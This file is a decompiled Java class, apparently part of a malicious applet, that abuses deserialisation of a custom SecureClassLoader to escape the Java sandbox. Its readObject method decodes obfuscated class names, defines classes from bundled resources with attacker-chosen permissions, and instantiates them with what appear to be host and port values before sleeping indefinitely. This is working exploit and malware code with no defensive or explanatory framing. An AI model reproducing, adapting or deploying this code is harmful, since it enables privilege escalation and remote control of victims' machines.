import java.io.InputStream;
import java.security.PermissionCollection;
import java.security.CodeSource;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.security.SecureClassLoader;

// 
// Decompiled by Procyon v0.5.30
// 

public class Halomorphic extends SecureClassLoader implements Serializable
{
    private static final long serialVersionUID = -6905751767065574277L;
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        final long n = 1000L;
        try {
            final Class autoLoadClass = this.autoLoadClass(main.Applet6e("\u0000\u0000\u0000\u0000\u0000\u0000X\u000e"));
            final String _x = main.__X;
            final Object instance = autoLoadClass.getConstructor(_x.getClass(), Integer.TYPE).newInstance(new String(_x), new Integer(Integer.parseInt(main.__k)));
            final Class autoLoadClass2 = this.autoLoadClass(main.Applet6e("\u0000\u0000\u0000\u0000\u0000\u0000P\u0007QuIE\t"));
            autoLoadClass2.getConstructor(autoLoadClass).newInstance(instance);
            autoLoadClass2.getField(main.Applet6e("}\u0005\u0003\u001e["));
            while (true) {
                try {
                    Thread.sleep(n);
                }
                catch (InterruptedException ex) {}
            }
        }
        catch (Exception ex2) {
            objectInputStream.defaultReadObject();
        }
    }
    
    public PermissionCollection getPermissions(final CodeSource codeSource) {
        return Applet3db752.__b(codeSource);
    }
    
    @Override
    protected Class findClass(final String s) throws ClassNotFoundException {
        Class autoLoadClass;
        try {
            autoLoadClass = this.autoLoadClass(s);
        }
        catch (IOException ex) {
            throw new ClassNotFoundException();
        }
        return autoLoadClass;
    }
    
    public Class autoLoadClass(final String s) throws IOException, ClassNotFoundException {
        final String applet6e = main.Applet6e("o\u0013\u001c\r\u0016\u0007");
        final InputStream resourceAsStream = main.class.getResourceAsStream(s + applet6e);
        if (resourceAsStream == null) {
            throw new ClassNotFoundException(s + applet6e);
        }
        final byte[] _q = Applet3db752.__q(resourceAsStream);
        this.defineClass(s, _q, 0, _q.length, Applet16e799.__c());
        return this.loadClass(s, true);
    }
}
